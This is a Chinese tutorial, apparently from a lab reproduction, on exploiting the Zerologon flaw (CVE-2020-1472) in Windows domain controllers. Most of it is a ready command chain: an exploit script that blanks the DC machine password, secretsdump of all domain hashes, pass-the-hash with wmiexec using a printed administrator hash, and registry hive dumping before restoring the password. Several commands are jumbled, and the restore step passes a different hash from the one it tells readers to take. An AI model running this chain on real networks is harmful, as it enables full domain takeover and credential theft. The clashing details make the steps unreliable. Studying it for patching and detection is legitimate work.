## **一、漏洞介绍**

CVE-2020-1472是一个Windows域控中严重的远程权限提升漏洞。攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。该漏洞适用于Win2008及后的所有版本。

##  **二、漏洞原理**

Netlogon使用的AES认证算法中的vi向量默认为0。这将导致攻击者可以绕过认证，并向域发起Netlogon计算机账户认证请求。攻击者可以使用8字节全0
client challenge 不断尝试，从而得到一个正确的8字节全0 client credential以通过认证，再通过相关调用完成对域控密码的修改。

攻击者只需要定位域控主机名及IP，同时确认可以访问域控，就可以在无需任何凭据的情况下 ( **可在域外** ) 取得域管理员的权限。

##  **三、漏洞复现**

1、使用工具检测域控是否存在该漏洞。若能返回Success，则说明DC存在漏洞。

python3 zerologon_tester.py 域控计算机名称 域控ip

python3 zerologon_tester.py owa 10.10.10.8

![](https://image.3001.net/images/20230825/1692928021_64e8081565f42f8a2077c.png!small)  
2、使用exploit漏洞脚本重置域控机器账号。

域控计算机名python3 cve-2020-1472-exploit.py

域控ip python3

cve-2020-1472-exploit.py owa 10.10.10.8

![](https://image.3001.net/images/20230825/1692928035_64e80823ecb2db5ce9178.png!small)  
3、使用impacket里的脚本和使用DCSync导出域内所有的用户凭证。

python3 secretsdump.py 域/域控计算机名$@域控ip -just-dc -no-pass #linux利用时$需要转义为\$
windows不需要转义 -no-pass 无密码登录 -just-dc. 仅提取NTDS.DIT数据(NTLM哈希和Kerberos键)

python3 secretsdump.py redteam.red/owa\$@10.10.10.8 -just-dc -no-pass

![](https://image.3001.net/images/20230825/1692928047_64e8082f5d4cae1137499.png!small)

  
此时，获取到域管的Hash。

Administrator:500:aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7:::

  

4、通过wmic hash进行传递。

python3 wmiexec.py -hashes 账户hash 域/账户名@域控ip python3 wmiexec.py -hashes
aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7
redteam.red/administrator@10.10.10.8

![](https://image.3001.net/images/20230825/1692928058_64e8083a18a8b747352b8.png!small)  
5、为了防止脱域，通过将SAM系统等文件导出到本地，以获取此前在域控制机器上保存的hash值，然后用于进行系统的恢复操作。

reg save HKLM\SYSTEM system.save

reg save HKLM\SAM sam.save

reg save HKLM\SECURITY security.save

lget system.save

lget sam.save

lget security.save

下载后，务必删除文件 del /f *.save。

![](https://image.3001.net/images/20230825/1692928068_64e80844ec1f4845bee44.png!small)  
6、通过导出sam.save、security.save和system.save等文件，获取域控制机器上保存的NTLM Hash值，并将其用于密码恢复操作。

python3 secretsdump.py -sam sam.save -system system.save -security
security.save LOCAL

![](https://image.3001.net/images/20230825/1692928079_64e8084f594cec9c642e3.png!small)  
7、通过取得$MACHINE.ACC:的值的后半部分或者$MACHINE.ACC:plain_password_hex的值，对其进⾏恢复。

$MACHINE.ACC:
aad3b435b51404eeaad3b435b51404ee:b3b0675e639b4efb2980bc22dd05a37e

$MACHINE.ACC:plain_password_hex:781a2beba2659bc7f184086fdf71440c54da34629fda115cabd39cb9e32846df3cf01dca22cc14ec289c867034c9dbc16ccc201f6db3e8dde620e6f4093353708271c00aa5c22974e41f3d7e10bcc809225ae99d1a841dbcf353a0a9ed4c1bf12cbbe5f20771957692632af762469c28aedc7b7d41860a3fd45275abe23eb54ebde6c073d4d96e855969c360c52b8df2a808027e34280cfe6be69082a0a10a5791ac8c1886a60e377562332770ed45e17282472461d5972a3e43ebaf2406033105a40f486ffb54af9e37979e0a75a87c99b08d0ae71beb836f64eca79af84199ed388595f90be931d480fcfc64054c75

注意只取“$MACHINE.ACC: ”的值的后半部分：b3b0675e639b4efb2980bc22dd05a37e

python3 restorepassword.py 域/预控计算机名称@预控计算机名称 --tar-ip 域控ip -hexpass
$MACHINE.ACC:的值的后半部分 python3 restorepassword.py redteam.red/owa@owa -target-ip
10.10.10.8 -hexpass 9c786d87f82b46071818e5bda3a9faab

![](https://image.3001.net/images/20230825/1692928092_64e8085c6bfc75e71c24b.png!small)  
此时可以使用脚本来检测是否已经恢复密码成功。

python3 secretsdump.py redteam.red/owa\$@10.10.10.8 -no-pass -just-dc

![](https://image.3001.net/images/20230825/1692928100_64e80864ba4ba4adf69cc.png!small)  
此时已⽆法获取到域内所有⽤户凭证 hash，⾄此恢复成功。

漏洞成功利用后，Windows安全日志将以事件ID 4742的形式显示相关信息。

在实际应用环境中，需要务必注意的是，该漏洞利用可能会导致域控制器的账户和密码被清空，进而可能影响域内的运行情况。例如，某些服务可能无法正常运行，甚至可能导致域成员从域中脱离。这是一个严重的问题，需要予以重视。

